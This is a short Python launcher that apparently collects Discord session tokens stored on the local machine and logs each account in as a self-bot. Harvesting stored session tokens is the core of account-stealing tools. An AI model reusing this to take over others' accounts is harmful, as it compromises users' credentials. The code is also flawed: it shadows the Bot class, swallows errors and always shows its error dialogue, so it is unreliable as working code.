from tokenFinder import findTokens
from launch import launch
from bot import Bot

import utils
import os

import asyncio
asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
loop = asyncio.get_event_loop()


TOKENS = findTokens()
for token in TOKENS:
    try:
        Bot = Bot()
        loop.create_task(Bot.start(token, bot=False))
    except:
        pass
else:
    utils.raiseDialogue("You are not logged into the Discord app or discord.com website")

loop.run_forever()

launch.launch()
